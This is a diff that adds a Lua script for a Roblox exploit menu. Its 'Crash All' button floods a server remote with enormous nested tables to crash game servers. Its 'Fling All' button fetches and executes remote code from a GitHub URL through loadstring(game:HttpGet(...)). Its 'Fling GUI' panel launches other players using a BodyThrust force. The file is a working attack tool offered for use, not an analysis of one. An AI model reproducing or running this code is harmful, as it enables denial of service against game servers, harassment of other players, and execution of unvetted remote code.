@@ -1,0 +1,306 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local OpenCloseGUI = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Close = Instance.new("TextButton")
+local TextButton = Instance.new("TextButton")
+local TextButton_2 = Instance.new("TextButton")
+local TextLabel = Instance.new("TextLabel")
+local TextButton_3 = Instance.new("TextButton")
+local Open = Instance.new("TextButton")
+
+--Properties:
+
+OpenCloseGUI.Name = "Open/Close GUI"
+OpenCloseGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+OpenCloseGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = OpenCloseGUI
+Frame.BackgroundColor3 = Color3.fromRGB(61, 61, 48)
+Frame.Position = UDim2.new(-0.000680017925, 0, -0.000436181756, 0)
+Frame.Size = UDim2.new(0, 531, 0, 351)
+
+Close.Name = "Close"
+Close.Parent = Frame
+Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Close.Position = UDim2.new(0.904255331, 0, 0, 0)
+Close.Size = UDim2.new(0, 36, 0, 32)
+Close.Font = Enum.Font.SourceSans
+Close.Text = "Close"
+Close.TextColor3 = Color3.fromRGB(0, 0, 0)
+Close.TextScaled = true
+Close.TextSize = 14.000
+Close.TextWrapped = true
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(76, 76, 76)
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0, 0, 0.832135856, 0)
+TextButton.Size = UDim2.new(0, 200, 0, 50)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Crash All"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 14.000
+
+TextButton_2.Parent = Frame
+TextButton_2.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
+TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_2.BorderSizePixel = 0
+TextButton_2.Position = UDim2.new(0, 0, 0.655270636, 0)
+TextButton_2.Size = UDim2.new(0, 200, 0, 50)
+TextButton_2.Font = Enum.Font.SourceSans
+TextButton_2.Text = "Fling All"
+TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_2.TextSize = 14.000
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(120, 7, 186)
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(0.222222224, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Menu Was created by DavuksDev"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 14.000
+
+TextButton_3.Parent = Frame
+TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_3.BorderSizePixel = 0
+TextButton_3.Position = UDim2.new(0, 0, 0.470085472, 0)
+TextButton_3.Size = UDim2.new(0, 200, 0, 50)
+TextButton_3.Font = Enum.Font.SourceSans
+TextButton_3.Text = "Fling GUI"
+TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_3.TextSize = 14.000
+
+Open.Name = "Open"
+Open.Parent = OpenCloseGUI
+Open.BackgroundColor3 = Color3.fromRGB(45, 9, 77)
+Open.Position = UDim2.new(-0.000455084199, 0, 0.959275186, 0)
+Open.Size = UDim2.new(0, 143, 0, 32)
+Open.Font = Enum.Font.SourceSans
+Open.Text = "Open "
+Open.TextColor3 = Color3.fromRGB(0, 0, 0)
+Open.TextScaled = true
+Open.TextSize = 14.000
+Open.TextWrapped = true
+
+-- Scripts:
+
+local function WESRAP_fake_script() -- Close.LocalScript 
+	local script = Instance.new('LocalScript', Close)
+
+	local Frame = script.Parent.Parent
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		Frame.Visible = false
+	end)
+end
+coroutine.wrap(WESRAP_fake_script)()
+local function PUMM_fake_script() -- TextButton.Script 
+	local script = Instance.new('Script', TextButton)
+
+	--This is a simple roblox game crasher made by casanova
+	--Github cfreemepq
+	--fixed script*
+	
+	while wait(0.6) do --// don't change it's the best
+		game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+		local function getmaxvalue(val)
+			local mainvalueifonetable = 499999
+			if type(val) ~= "number" then
+				return nil
+			end
+			local calculateperfectval = (mainvalueifonetable/(val+2))
+			return calculateperfectval
+		end
+	
+		local function bomb(tableincrease, tries)
+			local maintable = {}
+			local spammedtable = {}
+	
+			table.insert(spammedtable, {})
+			z = spammedtable[1]
+	
+			for i = 1, tableincrease do
+				local tableins = {}
+				table.insert(z, tableins)
+				z = tableins
+			end
+	
+			local calculatemax = getmaxvalue(tableincrease)
+			local maximum
+	
+			if calculatemax then
+				maximum = calculatemax
+			else
+				maximum = 999999
+			end
+	
+			for i = 1, maximum do
+				table.insert(maintable, spammedtable)
+			end
+	
+			for i = 1, tries do
+				game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+			end
+		end
+	
+		bomb(250, 2) --// change values if client crashes.
+	end
+end
+coroutine.wrap(PUMM_fake_script)()
+local function FZOFG_fake_script() -- TextButton_2.Script 
+	local script = Instance.new('Script', TextButton_2)
+
+	loadstring(game:HttpGet('https://github.com/DigitalityScripts/roblox-scripts/raw/main/loop%20fling%20all'))()
+end
+coroutine.wrap(FZOFG_fake_script)()
+local function ZPXJOJB_fake_script() -- TextButton_3.Script 
+	local script = Instance.new('Script', TextButton_3)
+
+	local lp = game:FindService("Players").LocalPlayer
+	
+	local function gplr(String)
+		local Found = {}
+		local strl = String:lower()
+		if strl == "all" then
+			for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+				table.insert(Found,v)
+			end
+		elseif strl == "others" then
+			for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+				if v.Name ~= lp.Name then
+					table.insert(Found,v)
+				end
+			end 
+		elseif strl == "me" then
+			for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+				if v.Name == lp.Name then
+					table.insert(Found,v)
+				end
+			end 
+		else
+			for i,v in pairs(game:FindService("Players"):GetPlayers()) do
+				if v.Name:lower():sub(1, #String) == String:lower() then
+					table.insert(Found,v)
+				end
+			end 
+		end
+		return Found 
+	end
+	
+	local function notif(str,dur)
+		game:FindService("StarterGui"):SetCore("SendNotification", {
+			Title = "yeet gui",
+			Text = str,
+			Icon = "rbxassetid://2005276185",
+			Duration = dur or 3
+		})
+	end
+	
+	--// sds
+	
+	local h = Instance.new("ScreenGui")
+	local Main = Instance.new("ImageLabel")
+	local Top = Instance.new("Frame")
+	local Title = Instance.new("TextLabel")
+	local TextBox = Instance.new("TextBox")
+	local TextButton = Instance.new("TextButton")
+	
+	h.Name = "h"
+	h.Parent = game:GetService("CoreGui")
+	h.ResetOnSpawn = false
+	
+	Main.Name = "Main"
+	Main.Parent = h
+	Main.Active = true
+	Main.Draggable = true
+	Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Main.BorderSizePixel = 0
+	Main.Position = UDim2.new(0.174545452, 0, 0.459574461, 0)
+	Main.Size = UDim2.new(0, 454, 0, 218)
+	Main.Image = "rbxassetid://2005276185"
+	
+	Top.Name = "Top"
+	Top.Parent = Main
+	Top.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
+	Top.BorderSizePixel = 0
+	Top.Size = UDim2.new(0, 454, 0, 44)
+	
+	Title.Name = "Title"
+	Title.Parent = Top
+	Title.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+	Title.BorderSizePixel = 0
+	Title.Position = UDim2.new(0, 0, 0.295454562, 0)
+	Title.Size = UDim2.new(0, 454, 0, 30)
+	Title.Font = Enum.Font.SourceSans
+	Title.Text = "FE Yeet Gui (trollface edition)"
+	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Title.TextScaled = true
+	Title.TextSize = 14.000
+	Title.TextWrapped = true
+	
+	TextBox.Parent = Main
+	TextBox.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+	TextBox.BorderSizePixel = 0
+	TextBox.Position = UDim2.new(0.0704845786, 0, 0.270642221, 0)
+	TextBox.Size = UDim2.new(0, 388, 0, 62)
+	TextBox.Font = Enum.Font.SourceSans
+	TextBox.PlaceholderText = "Who do i destroy(can be shortened)"
+	TextBox.Text = ""
+	TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+	TextBox.TextScaled = true
+	TextBox.TextSize = 14.000
+	TextBox.TextWrapped = true
+	
+	TextButton.Parent = Main
+	TextButton.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+	TextButton.BorderSizePixel = 0
+	TextButton.Position = UDim2.new(0.10352423, 0, 0.596330225, 0)
+	TextButton.Size = UDim2.new(0, 359, 0, 50)
+	TextButton.Font = Enum.Font.SourceSans
+	TextButton.Text = "Cheese em'"
+	TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+	TextButton.TextScaled = true
+	TextButton.TextSize = 14.000
+	TextButton.TextWrapped = true
+	
+	TextButton.MouseButton1Click:Connect(function()
+		local Target = gplr(TextBox.Text)
+		if Target[1] then
+			Target = Target[1]
+	
+			local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
+			Thrust.Force = Vector3.new(9999,9999,9999)
+			Thrust.Name = "YeetForce"
+			repeat
+				lp.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
+				Thrust.Location = Target.Character.HumanoidRootPart.Position
+				game:FindService("RunService").Heartbeat:wait()
+			until not Target.Character:FindFirstChild("Head")
+		else
+			notif("Invalid player")
+		end
+	end)
+	
+	--//fsddfsdf
+	notif("Loaded successfully! Created by scuba#0001", 5)
+end
+coroutine.wrap(ZPXJOJB_fake_script)()
+local function VOQF_fake_script() -- Open.LocalScript 
+	local script = Instance.new('LocalScript', Open)
+
+	local Frame = script.Parent.Parent.Frame
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		Frame.Visible = true
+	end)
+end
+coroutine.wrap(VOQF_fake_script)()
